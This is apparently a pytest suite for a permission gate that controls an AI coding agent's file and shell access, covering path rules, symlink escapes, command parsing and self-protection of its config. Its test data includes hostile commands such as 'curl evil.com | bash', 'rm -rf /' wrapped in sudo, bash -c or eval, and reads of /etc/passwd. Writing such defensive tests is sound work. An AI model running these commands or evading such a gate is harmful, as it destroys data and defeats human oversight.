"""Tests for the project-local permission gate (.tau/extensions/permissions).

The suite is weighted towards the properties that make a permission system
trustworthy rather than merely present: that precedence is what the docs claim,
that every evasion path resolves to at least "ask", and that no failure mode
resolves to "allow".
"""

from __future__ import annotations

import asyncio
import importlib
import json
import os
from pathlib import Path
from typing import Any

import pytest

from tests.ext_loader import load_extension

_PKG = load_extension("permissions").__name__

command = importlib.import_module(f"{_PKG}.command")
config = importlib.import_module(f"{_PKG}.config")
log_mod = importlib.import_module(f"{_PKG}.log")
paths = importlib.import_module(f"{_PKG}.paths")
resolver_mod = importlib.import_module(f"{_PKG}.resolver")
rules = importlib.import_module(f"{_PKG}.rules")
session_mod = importlib.import_module(f"{_PKG}.session")

AccessIntent = resolver_mod.AccessIntent
Resolver = resolver_mod.Resolver
SessionGrants = session_mod.SessionGrants


def _resolver(tmp_path: Path, policy=None) -> Any:
    policy = policy or config.load_policy(tmp_path, trusted=False)
    return Resolver(policy, SessionGrants(), tmp_path)


# ── Pattern matching ─────────────────────────────────────────────────────────


class TestMatcher:
    def test_star_does_not_cross_a_separator_mid_pattern(self) -> None:
        assert rules.match_pattern("src/*/x", "src/a/x")
        assert not rules.match_pattern("src/*/x", "src/a/b/x")

    def test_trailing_star_is_greedy_across_separators(self) -> None:
        # The rule that stops `~/.ssh/*` from protecting only the top level.
        assert rules.match_pattern("~/.ssh/*", "~/.ssh/id_rsa")
        assert rules.match_pattern("~/.ssh/*", "~/.ssh/nested/deep/key")

    def test_double_star_crosses_separators_anywhere(self) -> None:
        assert rules.match_pattern("**/.env", "/a/b/c/.env")
        assert rules.match_pattern("**/.env", ".env")

    def test_question_mark_matches_one_non_separator(self) -> None:
        assert rules.match_pattern("a?c", "abc")
        assert not rules.match_pattern("a?c", "a/c")

    def test_bare_star_matches_everything(self) -> None:
        assert rules.match_pattern("*", "/any/thing/at/all")

    def test_literal_dots_are_not_wildcards(self) -> None:
        assert not rules.match_pattern("a.txt", "axtxt")


class TestPrecedence:
    def test_last_matching_rule_wins_within_a_layer(self) -> None:
        ruleset = [
            rules.Rule("*", "allow"),
            rules.Rule("**/.env", "deny"),
            rules.Rule("**/.env.example", "allow"),
        ]
        assert rules.resolve_rules(ruleset, ["/p/.env"]).state == "deny"
        assert rules.resolve_rules(ruleset, ["/p/.env.example"]).state == "allow"

    def test_most_restrictive_wins_across_layers(self) -> None:
        assert rules.most_restrictive(["allow", "ask"]) == "ask"
        assert rules.most_restrictive(["allow", "deny", "ask"]) == "deny"
        assert rules.most_restrictive(["allow", "allow"]) == "allow"

    def test_no_layers_is_not_an_implicit_allow_of_deny(self) -> None:
        assert rules.most_restrictive([]) == "allow"


# ── Paths ────────────────────────────────────────────────────────────────────


class TestAccessPath:
    def test_relative_paths_also_match_their_absolute_form(self, tmp_path: Path) -> None:
        access = paths.AccessPath.build("src/app.py", tmp_path)
        values = access.match_values()
        assert "src/app.py" in values
        assert str(tmp_path / "src/app.py") in values

    def test_symlink_alias_cannot_dodge_a_rule(self, tmp_path: Path) -> None:
        secret = tmp_path / "secret.pem"
        secret.write_text("key")
        link = tmp_path / "innocent.txt"
        os.symlink(secret, link)

        access = paths.AccessPath.build("innocent.txt", tmp_path)

        # The literal name is innocuous; the resolved one is not, and a rule
        # written against `*.pem` must still fire.
        assert any(v.endswith("secret.pem") for v in access.match_values())
        assert rules.match_any("**/*.pem", access.match_values())

    def test_a_broken_symlink_does_not_raise(self, tmp_path: Path) -> None:
        link = tmp_path / "dangling"
        os.symlink(tmp_path / "missing", link)
        access = paths.AccessPath.build("dangling", tmp_path)
        assert access.match_values()

    def test_escapes_detects_parent_traversal(self, tmp_path: Path) -> None:
        inside = paths.AccessPath.build("src/app.py", tmp_path)
        outside = paths.AccessPath.build("../../etc/passwd", tmp_path)
        assert not inside.escapes(tmp_path)
        assert outside.escapes(tmp_path)

    def test_escapes_detects_a_symlink_pointing_out_of_the_project(self, tmp_path: Path) -> None:
        project = tmp_path / "project"
        project.mkdir()
        target = tmp_path / "outside.txt"
        target.write_text("x")
        os.symlink(target, project / "link.txt")

        access = paths.AccessPath.build("link.txt", project)
        assert access.escapes(project)

    def test_home_paths_gain_a_tilde_spelling(self, tmp_path: Path) -> None:
        home = tmp_path / "home"
        (home / ".ssh").mkdir(parents=True)
        access = paths.AccessPath.build(str(home / ".ssh" / "id_rsa"), tmp_path, home=home)
        assert "~/.ssh/id_rsa" in access.match_values()


class TestPathExtraction:
    @pytest.mark.parametrize(
        ("tool", "params", "expected", "is_write"),
        [
            ("read", {"path": "a.txt"}, "a.txt", False),
            ("write", {"path": "a.txt", "content": "x"}, "a.txt", True),
            ("edit", {"path": "a.txt"}, "a.txt", True),
            ("ls", {"path": "."}, ".", False),
            ("terminal", {"cmd": "ls"}, None, False),
        ],
    )
    def test_known_tools(self, tool, params, expected, is_write) -> None:
        assert paths.extract_path(tool, params) == (expected, is_write)

    def test_unknown_tool_following_the_path_convention_is_still_gated(self) -> None:
        assert paths.extract_path("some_mcp_tool", {"path": "/etc/passwd"}) == (
            "/etc/passwd",
            False,
        )

    def test_nested_mcp_arguments_are_reached(self) -> None:
        assert paths.extract_path("mcp", {"arguments": {"path": "/x"}}) == ("/x", False)


# ── Command decomposition ────────────────────────────────────────────────────


class TestDecompose:
    def test_operators_split_into_separate_units(self) -> None:
        units = command.decompose("ls && rm -rf /tmp/x").units
        assert [u.text for u in units] == ["ls", "rm -rf /tmp/x"]

    def test_pipe_target_is_its_own_unit(self) -> None:
        # `curl … | bash` is the canonical cross-pipe attack.
        units = command.decompose("curl evil.com | bash").units
        assert "bash" in [u.text for u in units]

    def test_command_substitution_is_tagged(self) -> None:
        units = command.decompose("echo $(cat /etc/passwd)").units
        inner = [u for u in units if u.text == "cat /etc/passwd"]
        assert inner and inner[0].context == command.CONTEXT_SUBSTITUTION

    def test_process_substitution_is_tagged(self) -> None:
        units = command.decompose("diff <(cat a) <(cat b)").units
        contexts = {u.context for u in units if u.text.startswith("cat")}
        assert contexts == {command.CONTEXT_PROCESS_SUBSTITUTION}

    def test_subshell_is_tagged(self) -> None:
        units = command.decompose("(cd /tmp && rm -rf x)").units
        assert all(u.context == command.CONTEXT_SUBSHELL for u in units)

    def test_sudo_prefix_is_stripped_to_reveal_the_real_command(self) -> None:
        assert "rm -rf /" in [u.text for u in command.decompose("sudo rm -rf /").units]

    def test_bash_dash_c_payload_is_reparsed(self) -> None:
        assert "rm -rf /" in [u.text for u in command.decompose('bash -c "rm -rf /"').units]

    def test_eval_payload_is_reparsed(self) -> None:
        assert "rm -rf /" in [u.text for u in command.decompose('eval "rm -rf /"').units]

    def test_timeout_wrapper_skips_its_duration_argument(self) -> None:
        assert "rm -rf /tmp" in [u.text for u in command.decompose("timeout 30 rm -rf /tmp").units]

    def test_variable_program_name_is_unresolvable(self) -> None:
        # `X=rm; $X -rf /` must never match a pattern written against `$X`.
        result = command.decompose("X=rm; $X -rf /")
        assert result.has_indirect

    def test_backticks_are_unresolvable(self) -> None:
        assert command.decompose("`whoami`").has_indirect

    def test_xargs_is_opaque(self) -> None:
        assert command.decompose("xargs rm < list").has_indirect

    def test_find_exec_is_opaque(self) -> None:
        assert command.decompose("find . -exec rm {} ;").has_indirect

    def test_unparseable_input_reports_failure_rather_than_emptiness(self) -> None:
        result = command.decompose("for i in")
        assert result.parsed is False
        # It still yields a unit, so the caller has something to gate on.
        assert result.units

    def test_empty_command_is_not_an_error(self) -> None:
        assert command.decompose("   ").units == ()

    def test_deep_wrapper_nesting_terminates(self) -> None:
        nested = 'bash -c "' * 8 + "rm -rf /" + '"' * 8
        assert command.decompose(nested) is not None


# ── Config ───────────────────────────────────────────────────────────────────


class TestConfig:
    def test_defaults_protect_env_and_keys(self, tmp_path: Path) -> None:
        policy = config.load_policy(tmp_path, trusted=False)
        assert rules.resolve_rules(policy.path_rules, ["/p/.env"]).state == "deny"
        assert rules.resolve_rules(policy.path_rules, ["/p/key.pem"]).state == "deny"

    def test_project_scope_is_ignored_when_untrusted(self, tmp_path: Path) -> None:
        _write_project_config(tmp_path, {"permission": {"write": "allow"}})

        untrusted = config.load_policy(tmp_path, trusted=False)
        trusted = config.load_policy(tmp_path, trusted=True)

        assert untrusted.tool_states.get("write") == "ask"  # built-in default
        assert trusted.tool_states.get("write") == "allow"

    def test_malformed_project_config_clamps_allow_to_ask(self, tmp_path: Path) -> None:
        path = tmp_path / config.CONFIG_RELATIVE
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("{ not json")

        policy = config.load_policy(tmp_path, trusted=True)

        assert "project" in policy.invalid_scopes
        # `*` defaults to allow; a broken scope must tighten it, not keep it.
        assert policy.default_state == "ask"

    def test_deny_with_reason_is_carried_through(self, tmp_path: Path) -> None:
        _write_project_config(
            tmp_path,
            {"permission": {"path": {"**/*.key": {"action": "deny", "reason": "No keys."}}}},
        )
        policy = config.load_policy(tmp_path, trusted=True)
        rule = rules.resolve_rules(policy.path_rules, ["/p/a.key"])
        assert rule.state == "deny"
        assert rule.reason == "No keys."

    def test_project_rules_are_applied_after_global_ones(self, tmp_path: Path) -> None:
        # Re-allowing `.env` from the project scope must win over the built-in
        # deny, because later rules take precedence within a layer.
        _write_project_config(tmp_path, {"permission": {"path": {"**/.env": "allow"}}})
        policy = config.load_policy(tmp_path, trusted=True)
        assert rules.resolve_rules(policy.path_rules, ["/p/.env"]).state == "allow"

    def test_invalid_rule_values_are_skipped_not_fatal(self, tmp_path: Path) -> None:
        _write_project_config(tmp_path, {"permission": {"path": {"a": 42}}})
        policy = config.load_policy(tmp_path, trusted=True)
        assert policy is not None

    def test_settings_are_read_from_the_project_scope(self, tmp_path: Path) -> None:
        _write_project_config(tmp_path, {"headlessDefault": "ask", "promptTimeoutSeconds": 42})
        policy = config.load_policy(tmp_path, trusted=True)
        assert policy.settings.headless_default == "ask"
        assert policy.settings.prompt_timeout_seconds == 42


def _write_project_config(root: Path, data: dict) -> None:
    path = root / config.CONFIG_RELATIVE
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(data))


# ── Resolver ─────────────────────────────────────────────────────────────────


class TestResolver:
    def test_ordinary_read_is_allowed(self, tmp_path: Path) -> None:
        decision = _resolver(tmp_path).resolve(
            AccessIntent("read", {"path": "README.md"}, tmp_path)
        )
        assert decision.state == "allow"

    def test_env_file_is_denied_with_the_configured_reason(self, tmp_path: Path) -> None:
        decision = _resolver(tmp_path).resolve(AccessIntent("read", {"path": ".env"}, tmp_path))
        assert decision.state == "deny"
        assert decision.surface == "path"
        assert "secret" in (decision.reason or "").lower()

    def test_env_example_is_exempt(self, tmp_path: Path) -> None:
        decision = _resolver(tmp_path).resolve(
            AccessIntent("read", {"path": ".env.example"}, tmp_path)
        )
        assert decision.state == "allow"

    def test_outside_the_project_asks(self, tmp_path: Path) -> None:
        decision = _resolver(tmp_path).resolve(
            AccessIntent("read", {"path": "/etc/hosts"}, tmp_path)
        )
        assert decision.state == "ask"
        assert decision.surface == "external_directory"

    def test_writing_the_extensions_own_config_is_always_denied(self, tmp_path: Path) -> None:
        decision = _resolver(tmp_path).resolve(
            AccessIntent(
                "write",
                {"path": ".tau/extensions/permissions/config.json", "content": "{}"},
                tmp_path,
            )
        )
        assert decision.state == "deny"
        assert decision.surface == "self_protection"

    def test_self_protection_beats_an_explicit_project_allow(self, tmp_path: Path) -> None:
        _write_project_config(tmp_path, {"permission": {"*": "allow", "write": "allow"}})
        policy = config.load_policy(tmp_path, trusted=True)

        decision = _resolver(tmp_path, policy).resolve(
            AccessIntent(
                "write",
                {"path": ".tau/extensions/permissions/config.json", "content": "{}"},
                tmp_path,
            )
        )
        assert decision.state == "deny"

    def test_allowlisted_command_runs(self, tmp_path: Path) -> None:
        decision = _resolver(tmp_path).resolve(
            AccessIntent("terminal", {"cmd": "git status"}, tmp_path)
        )
        assert decision.state == "allow"

    def test_one_dangerous_segment_condemns_the_whole_command(self, tmp_path: Path) -> None:
        # `ls` alone is allowed; the shell would still run the `rm`.
        decision = _resolver(tmp_path).resolve(
            AccessIntent("terminal", {"cmd": "ls && rm -rf /"}, tmp_path)
        )
        assert decision.state == "deny"
        assert decision.surface == "command"

    def test_sudo_does_not_launder_a_denied_command(self, tmp_path: Path) -> None:
        decision = _resolver(tmp_path).resolve(
            AccessIntent("terminal", {"cmd": "sudo rm -rf /"}, tmp_path)
        )
        assert decision.state == "deny"

    def test_bash_dash_c_does_not_launder_a_denied_command(self, tmp_path: Path) -> None:
        decision = _resolver(tmp_path).resolve(
            AccessIntent("terminal", {"cmd": 'bash -c "rm -rf /"'}, tmp_path)
        )
        assert decision.state == "deny"

    def test_unparseable_command_asks_rather_than_allows(self, tmp_path: Path) -> None:
        decision = _resolver(tmp_path).resolve(
            AccessIntent("terminal", {"cmd": "for i in"}, tmp_path)
        )
        assert decision.state == "ask"

    def test_variable_indirection_cannot_reach_allow(self, tmp_path: Path) -> None:
        _write_project_config(tmp_path, {"permission": {"terminal": {"*": "allow"}}})
        policy = config.load_policy(tmp_path, trusted=True)

        decision = _resolver(tmp_path, policy).resolve(
            AccessIntent("terminal", {"cmd": "X=rm; $X -rf /"}, tmp_path)
        )
        # Even with a blanket allow, an unresolvable command is clamped to ask.
        assert decision.state == "ask"

    def test_a_gate_error_denies_rather_than_allows(self, tmp_path: Path) -> None:
        resolver = _resolver(tmp_path)

        def boom(*_args, **_kwargs):
            raise RuntimeError("policy exploded")

        resolver._tool_layer = boom  # type: ignore[attr-defined]

        decision = resolver.resolve(AccessIntent("read", {"path": "a.txt"}, tmp_path))
        assert decision.state == "deny"
        assert decision.surface == "gate_error"

    def test_path_allow_cannot_loosen_the_project_boundary(self, tmp_path: Path) -> None:
        _write_project_config(tmp_path, {"permission": {"path": {"*": "allow"}}})
        policy = config.load_policy(tmp_path, trusted=True)

        decision = _resolver(tmp_path, policy).resolve(
            AccessIntent("read", {"path": "/etc/hosts"}, tmp_path)
        )
        assert decision.state == "ask"


class TestSessionGrants:
    def test_a_grant_upgrades_ask_to_allow(self, tmp_path: Path) -> None:
        policy = config.load_policy(tmp_path, trusted=False)
        grants = SessionGrants()
        resolver = Resolver(policy, grants, tmp_path)
        intent = AccessIntent("read", {"path": "/etc/hosts"}, tmp_path)

        assert resolver.resolve(intent).state == "ask"

        grants.grant("external_directory", "/etc/*")
        assert resolver.resolve(intent).state == "allow"

    def test_a_grant_cannot_overturn_a_deny(self, tmp_path: Path) -> None:
        policy = config.load_policy(tmp_path, trusted=False)
        grants = SessionGrants()
        grants.grant("path", "*")
        resolver = Resolver(policy, grants, tmp_path)

        decision = resolver.resolve(AccessIntent("read", {"path": ".env"}, tmp_path))
        assert decision.state == "deny"

    def test_grants_are_scoped_to_their_surface(self) -> None:
        grants = SessionGrants()
        grants.grant("path", "/tmp/*")
        assert grants.allows("path", ["/tmp/x"]) is not None
        assert grants.allows("command", ["/tmp/x"]) is None

    def test_clearing_revokes_everything(self) -> None:
        grants = SessionGrants()
        grants.grant("path", "/tmp/*")
        grants.clear()
        assert len(grants) == 0


# ── Decision log ─────────────────────────────────────────────────────────────


class TestDecisionLog:
    def test_entries_round_trip(self, tmp_path: Path) -> None:
        log = log_mod.DecisionLog(tmp_path)
        log.record(
            "read",
            {"path": ".env"},
            rules.Decision(state="deny", surface="path", target=".env", matched_pattern="**/.env"),
        )
        entries = log.tail()
        assert len(entries) == 1
        assert entries[0]["state"] == "deny"
        assert entries[0]["pattern"] == "**/.env"

    def test_file_contents_are_redacted_not_logged(self, tmp_path: Path) -> None:
        log = log_mod.DecisionLog(tmp_path)
        secret = "SECRET-VALUE-" + "x" * 100
        log.record(
            "write",
            {"path": "a.txt", "content": secret},
            rules.Decision(state="allow", surface="tool", target="write"),
        )
        raw = (tmp_path / log_mod.LOG_RELATIVE).read_text()
        assert "SECRET-VALUE" not in raw
        assert "redacted" in raw

    def test_disabled_log_writes_nothing(self, tmp_path: Path) -> None:
        log = log_mod.DecisionLog(tmp_path, enabled=False)
        log.record("read", {}, rules.Decision(state="allow", surface="tool"))
        assert not (tmp_path / log_mod.LOG_RELATIVE).exists()

    def test_an_unwritable_log_does_not_break_the_gate(self, tmp_path: Path) -> None:
        log = log_mod.DecisionLog(tmp_path / "nope")
        log._path = Path("/proc/cannot/write/here.log")  # type: ignore[attr-defined]
        log.record("read", {}, rules.Decision(state="allow", surface="tool"))  # must not raise


# ── Gate wiring ──────────────────────────────────────────────────────────────


class _UI:
    """Stand-in UI that answers every prompt with a fixed choice."""

    supports_components = True

    def __init__(self, answer: str | None) -> None:
        self.answer = answer
        self.notes: list[object] = []

    async def select(self, title: str, options: list[str]) -> str | None:
        if self.answer is None:
            return None
        return next((o for o in options if o.startswith(self.answer)), None)

    def notify(self, message, type="info") -> None:  # noqa: A002
        self.notes.append(message)


class TestGate:
    def test_ask_becomes_allow_when_the_user_approves(self, tmp_path: Path) -> None:
        gate = _gate(tmp_path)
        decision = asyncio.run(gate.decide("read", {"path": "/etc/hosts"}, _UI("Allow once")))
        assert decision.state == "allow"

    def test_ask_becomes_deny_when_the_user_declines(self, tmp_path: Path) -> None:
        gate = _gate(tmp_path)
        decision = asyncio.run(gate.decide("read", {"path": "/etc/hosts"}, _UI("Deny")))
        assert decision.state == "deny"

    def test_dismissing_the_prompt_denies(self, tmp_path: Path) -> None:
        gate = _gate(tmp_path)
        decision = asyncio.run(gate.decide("read", {"path": "/etc/hosts"}, _UI(None)))
        assert decision.state == "deny"

    def test_session_approval_is_remembered_for_later_calls(self, tmp_path: Path) -> None:
        gate = _gate(tmp_path)
        ui = _UI("Allow for this session")

        first = asyncio.run(gate.decide("read", {"path": "/etc/hosts"}, ui))
        assert first.state == "allow"

        # A second call in the same directory needs no prompt at all.
        second = asyncio.run(gate.decide("read", {"path": "/etc/passwd"}, _UI("Deny")))
        assert second.state == "allow"

    def test_no_ui_applies_the_headless_default(self, tmp_path: Path) -> None:
        gate = _gate(tmp_path)
        decision = asyncio.run(gate.decide("read", {"path": "/etc/hosts"}, None))
        assert decision.state == "deny"

    def test_headless_default_is_configurable(self, tmp_path: Path) -> None:
        _write_project_config(tmp_path, {"headlessDefault": "allow"})
        gate = _gate(tmp_path, trusted=True)
        decision = asyncio.run(gate.decide("read", {"path": "/etc/hosts"}, None))
        assert decision.state == "allow"

    def test_a_prompt_timeout_denies(self, tmp_path: Path) -> None:
        _write_project_config(tmp_path, {"promptTimeoutSeconds": 1})
        gate = _gate(tmp_path, trusted=True)

        class _Hanging:
            supports_components = True

            async def select(self, title, options):
                await asyncio.sleep(10)
                return options[0]

        decision = asyncio.run(gate.decide("read", {"path": "/etc/hosts"}, _Hanging()))
        assert decision.state == "deny"

    def test_denied_calls_are_logged(self, tmp_path: Path) -> None:
        gate = _gate(tmp_path)
        asyncio.run(gate.decide("read", {"path": ".env"}, None))
        assert gate.log.tail()[-1]["state"] == "deny"


def _gate(tmp_path: Path, *, trusted: bool = False):
    module = importlib.import_module(_PKG)
    gate = module.PermissionGate(tmp_path)
    gate.reload(trusted=trusted)
    return gate


def test_denial_message_tells_the_model_not_to_retry() -> None:
    module = importlib.import_module(_PKG)
    message = module._denial_message(
        rules.Decision(
            state="deny",
            surface="path",
            target=".env",
            matched_pattern="**/.env",
            reason="Environment files hold secrets.",
        )
    )
    assert "**/.env" in message
    assert "not retry" in message.lower()


# ── Reload wiring ────────────────────────────────────────────────────────────


class _API:
    """ExtensionAPI double recording what register() subscribes to."""

    def __init__(self, cwd: Path) -> None:
        self.cwd = str(cwd)
        self.handlers: dict[str, list[Any]] = {}
        self.commands: list[str] = []
        self.active_tools: list[str] | None = None

    def on(self, event: str, handler: Any = None) -> Any:
        if handler is None:

            def deco(fn: Any) -> Any:
                self.handlers.setdefault(event, []).append(fn)
                return fn

            return deco
        self.handlers.setdefault(event, []).append(handler)
        return handler

    def register_command(self, name: str, *_a: Any, **_k: Any) -> None:
        self.commands.append(name)

    def set_active_tools(self, names: list[str]) -> None:
        self.active_tools = names


class _ReloadCtx:
    ui = None

    def __init__(self, trusted: bool = True) -> None:
        self._trusted = trusted

    async def is_project_trusted(self) -> bool:
        return self._trusted

    def get_system_prompt_options(self) -> dict:
        return {"tools": ["read", "write", "terminal"]}


class TestReloadWiring:
    """A /reload rebuilds the gate, so the policy must be re-read there too.

    Mirrors the todo extension's bug: register() runs again on reload and
    runtime_ready does not fire a second time, so an extension that loads state
    only from runtime_ready silently runs on defaults afterwards.
    """

    def test_policy_loads_on_both_startup_and_reload(self, tmp_path: Path) -> None:
        module = importlib.import_module(_PKG)
        api = _API(tmp_path)
        module.register(api)

        assert api.handlers.get("runtime_ready"), "policy must load at startup"
        assert api.handlers.get("extension_reloaded"), "policy must reload on /reload"

    def test_the_same_handler_serves_both_events(self, tmp_path: Path) -> None:
        module = importlib.import_module(_PKG)
        api = _API(tmp_path)
        module.register(api)

        assert api.handlers["runtime_ready"] == api.handlers["extension_reloaded"]

    def test_config_edited_before_a_reload_is_picked_up(self, tmp_path: Path) -> None:
        module = importlib.import_module(_PKG)
        api = _API(tmp_path)
        module.register(api)

        # Config written after register(), as an edit between reloads would be.
        _write_project_config(tmp_path, {"permission": {"read": "deny"}})

        handler = api.handlers["extension_reloaded"][0]
        asyncio.run(handler(None, _ReloadCtx()))

        # The reload must have seen the file, not the built-in defaults.
        gate_module = importlib.import_module(_PKG)
        assert gate_module is module  # sanity: same package instance
        assert api.active_tools is not None, "a fully denied tool should be hidden"
        assert "read" not in api.active_tools

    def test_untrusted_project_config_is_still_ignored_on_reload(self, tmp_path: Path) -> None:
        module = importlib.import_module(_PKG)
        api = _API(tmp_path)
        module.register(api)

        _write_project_config(tmp_path, {"permission": {"read": "deny"}})

        handler = api.handlers["extension_reloaded"][0]
        asyncio.run(handler(None, _ReloadCtx(trusted=False)))

        # Untrusted means the project scope never loads, so nothing is hidden.
        assert api.active_tools is None
